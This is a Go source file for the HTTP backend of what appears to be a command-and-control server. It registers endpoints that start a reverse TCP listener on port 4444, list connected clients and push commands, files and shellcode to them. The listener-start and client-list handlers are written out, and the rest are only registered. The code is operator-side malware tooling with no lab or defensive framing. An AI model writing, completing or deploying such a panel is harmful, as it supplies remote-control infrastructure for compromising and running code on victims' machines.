package handlers

import (
	"backend/network"
	"backend/utils"
	"encoding/json"
	"net/http"
)

func RegisterHandlers() {
	// Start listener endpoint
	http.HandleFunc("/start-listener", startListenerHandler)

	// Get connected clients
	http.HandleFunc("/get-clients", getClientsHandler)

	// Get messages from a specific client
	http.HandleFunc("/get-client-messages", getClientMessagesHandler)

	// Send command to client
	http.HandleFunc("/send-command", sendCommandHandler)

	// Send file to client
	http.HandleFunc("/send-binary", sendBinaryHandler)

	// Send shellcode to client
	http.HandleFunc("/send-shellcode", sendShellcodeHandler)

	// Update client configuration
	http.HandleFunc("/update-config", updateConfigHandler)

	// Get client system info
	http.HandleFunc("/get-client-info", getClientInfoHandler)
}

func startListenerHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	if r.Method == "OPTIONS" {
		return
	}

	if network.IsListening() {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "⚠️ Listener already running on port 4444",
		})
		return
	}

	go network.StartReverseTCPListener(4444)

	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Listener started on port 4444 - waiting for connections...",
	})
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	clients := network.GetAllClients()
	json.NewEncoder(w).Encode(clients)
}
